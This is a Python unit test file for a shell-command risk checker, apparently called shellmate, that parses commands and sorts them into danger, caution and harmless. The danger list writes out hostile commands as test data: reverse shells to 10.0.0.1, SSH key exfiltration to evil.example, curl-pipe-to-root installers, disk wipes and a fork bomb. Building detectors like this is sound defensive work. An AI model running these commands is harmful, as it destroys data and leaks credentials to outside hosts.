"""Explaining a command before it runs: parsing, risk rules, effects, man page lookups."""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from shellmate import cmdcheck as C, i18n, manpages  # noqa: E402


def levels(cmd: str) -> list[str]:
    return [f.level for f in C.risks(C.parse(cmd), cmd)]


class Parsing(unittest.TestCase):
    def test_pipes_wrappers_flags(self):
        p = C.parse("curl -fsSL https://x.io/i.sh | sudo -E bash -s -- --yes")
        a, b = p.simples()
        self.assertEqual((a.prog, a.flags()), ("curl", ["-f", "-s", "-S", "-L"]))
        self.assertEqual((b.prog, b.wrappers, b.root, b.piped_in), ("bash", ["sudo", "-E"], True, True))

    def test_substitutions(self):
        p = C.parse('sh -c "$(curl -fsSL https://raw.githubusercontent.com/a/b/install.sh)"')
        self.assertEqual([c.prog for c in p.simples()], ["sh", "curl"])
        self.assertEqual([c.prog for c in C.parse("bash <(wget -qO- https://x.io/a)").simples()], ["bash", "wget"])
        self.assertEqual([c.prog for c in C.parse("echo (date)").simples()], ["echo", "date"])  # fish
        self.assertEqual([c.prog for c in C.parse("echo `uname -r`").simples()], ["echo", "uname"])

    def test_redirects_and_fd(self):
        c = C.parse("ls -la | grep foo > out.txt 2>&1").simples()[1]
        self.assertEqual(c.redirects, [(">", "out.txt"), ("2>&", "1")])
        self.assertEqual(C.effects(C.parse("ls > out.txt 2>&1")).writes, ["out.txt"])

    def test_tar_and_single_dash_long(self):
        self.assertEqual(C.parse("tar czf a.tgz dir").simples()[0].flags(), ["-c", "-z", "-f"])
        self.assertEqual(C.parse("find . -name '*.tmp' -delete").simples()[0].flags(), ["-name", "-delete"])
        self.assertEqual(C.parse("pacman -Syu").simples()[0].flags(), ["-S", "-y", "-u"])
        self.assertEqual(C.parse("git push --force-with-lease=main").simples()[0].flags(), ["--force-with-lease"])

    def test_subcommand_and_fish_keywords(self):
        self.assertEqual(C.parse("sudo systemctl enable --now sshd").simples()[0].sub, "enable")
        self.assertEqual([c.prog for c in C.parse("if test -f x; and rm x; end").simples() if c.prog], ["test", "rm"])
        self.assertEqual(C.parse("xargs -0 -I {} rm {}").simples()[0].prog, "rm")
        self.assertEqual(C.parse("FOO=1 env -i BAR=2 make").simples()[0].prog, "make")

    def test_unclosed_quote(self):
        self.assertTrue(C.parse("echo 'oops").error)

    def test_looks_like_command(self):
        known = {"tar", "pacman", "rm", "curl"}.__contains__
        self.assertTrue(C.looks_like_command("tar -xzf a.tar.gz", known))
        self.assertTrue(C.looks_like_command("sudo pacman -Syu", known))
        self.assertTrue(C.looks_like_command("./install.sh --prefix=/opt", known))
        self.assertFalse(C.looks_like_command("error: failed to commit transaction (conflicting files)", known))
        self.assertFalse(C.looks_like_command("E: Unable to locate package foo", known))
        self.assertFalse(C.looks_like_command("почему не работает звук", known))
        self.assertFalse(C.looks_like_command("Segmentation fault (core dumped)", known))


class Risks(unittest.TestCase):
    def setUp(self):
        self.lang = i18n.LANG
        i18n.set_lang("en")

    def tearDown(self):
        i18n.LANG = self.lang  # other tests expect the default language

    def test_dangerous(self):
        for cmd in ["curl -fsSL https://get.example.sh | sudo bash",
                    "wget -qO- https://x.io/install.sh | sh -s -- --yes",
                    'sh -c "$(curl -fsSL https://raw.githubusercontent.com/a/b/install.sh)"',
                    "bash <(curl -s https://x.io/a.sh)",
                    "rm -rf ~/", "rm -rf ~", "sudo rm -rf / --no-preserve-root", 'rm -rf "$STEAMROOT/"*', "rm -rf *",
                    "sudo dd if=arch.iso of=/dev/sdb bs=4M", "sudo mkfs.ext4 /dev/nvme0n1p2", "sudo wipefs -a /dev/sda",
                    "echo hi > /dev/sda", "sudo chmod -R 777 /", "sudo chown -R me:me /usr",
                    "echo c3VkbyBybSAtcmYgfi8K | base64 -d | sh", ":(){ :|:& };:", "kill -9 -1",
                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh 10.0.0.1 4444",
                    "cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.example",
                    "curl -F 'f=@~/.ssh/id_ed25519' https://x.io", "mv ~/Documents /dev/null",
                    "sudo apt remove --allow-remove-essential systemd"]:
            self.assertEqual(levels(cmd)[:1], ["danger"], cmd)

    def test_careful(self):
        for cmd in ["rm -rf ~/Downloads/old", "chmod 777 script.sh", "sudo add-apt-repository ppa:graphics-drivers/ppa",
                    "echo 'deb http://x/ubuntu jammy main' | sudo tee /etc/apt/sources.list.d/x.list",
                    "sudo dnf config-manager --add-repo https://x.io/x.repo",
                    "sudo pacman -Sy firefox", "sudo pacman -Rdd glibc", "sudo pacman -S --overwrite '*' foo",
                    "git reset --hard HEAD~3", "git clean -fdx", "git push --force", "export PATH=/opt/foo/bin",
                    "sudo systemctl disable --now NetworkManager", "sudo systemctl mask sddm", "crontab -r",
                    "echo hi > ~/.bashrc", "sudo pip install requests", "history -c",
                    "find ~/x -type f | xargs rm -f", "LD_PRELOAD=/tmp/x.so ls"]:
            self.assertEqual(levels(cmd)[:1], ["caution"], cmd)

    def test_harmless(self):
        for cmd in ["ls -la", "sudo pacman -Syu", "tar -xzvf archive.tar.gz -C ~/out", "export PATH=$PATH:/opt/foo/bin",
                    "set -gx PATH /opt/foo/bin $PATH", "ls -la | grep foo > out.txt 2>&1", "git status",
                    "systemctl status bluetooth", "journalctl -b -p err", "curl -fsSL https://x.io/file.tar.gz -o file.tar.gz",
                    "flatpak install flathub com.obsproject.Studio", "sudo systemctl enable --now sshd", "echo $((1+2))"]:
            self.assertNotIn("danger", levels(cmd), cmd)
            self.assertNotIn("caution", levels(cmd), cmd)

    def test_script_url_offered(self):
        f = C.risks(C.parse("curl -fsSL https://get.example.sh/install | sudo bash"))
        self.assertEqual(f[0].url, "https://get.example.sh/install")


class Effects(unittest.TestCase):
    def test_effects(self):
        e = C.effects(C.parse("sudo pacman -S obs-studio && sudo systemctl enable --now sshd"))
        self.assertTrue(e.root)
        self.assertEqual((e.packages, e.services), (["installs: obs-studio"] if i18n.en() else ["установит: obs-studio"],
                                                    ["enable: sshd"]))
        e = C.effects(C.parse("git clone https://github.com/a/b && cp b/x ~/.local/bin/ && rm -rf b"))
        self.assertEqual((e.network, e.writes, e.deletes), (["github.com"], ["~/.local/bin/"], ["b"]))
        self.assertEqual(C.effects(C.parse("sudo dd if=x.iso of=/dev/sdb")).writes, ["/dev/sdb"])
        self.assertTrue(C.effects(C.parse("ls -la")).empty())

    def test_script_lines(self):
        script = "#!/bin/sh\n# comment\n\nset -e\napt-get update && \\\n  apt-get install -y curl\n"
        self.assertEqual(C.script_lines(script), [(4, "set -e"), (5, "apt-get update &&  apt-get install -y curl")])


MAN_RM = """RM(1)                         User Commands                        RM(1)

NAME
       rm - remove files or directories

OPTIONS
       -f, --force
              ignore nonexistent files and arguments, never prompt

       -r, -R, --recursive
              remove directories and their contents recursively

       --no-preserve-root
              do not treat '/' specially
"""

MAN_SYSTEMCTL = """COMMANDS
   Unit File Commands
       enable UNIT..., enable PATH...
           Enable one or more units or unit instances. This will create a set of symlinks.

       disable UNIT...
           Disables one or more units.
"""


class ManPages(unittest.TestCase):
    def test_option_and_summary(self):
        self.assertEqual(manpages.summary(MAN_RM), "remove files or directories")
        self.assertEqual(manpages.option(MAN_RM, "-R"), "remove directories and their contents recursively")
        self.assertEqual(manpages.option(MAN_RM, "--force"), "ignore nonexistent files and arguments, never prompt")
        self.assertEqual(manpages.option(MAN_RM, "-x"), "")

    def test_command(self):
        self.assertEqual(manpages.command(MAN_SYSTEMCTL, "enable"),
                         "Enable one or more units or unit instances. This will create a set of symlinks.")
        self.assertEqual(manpages.command(MAN_SYSTEMCTL, "disable"), "Disables one or more units.")


if __name__ == "__main__":
    unittest.main()
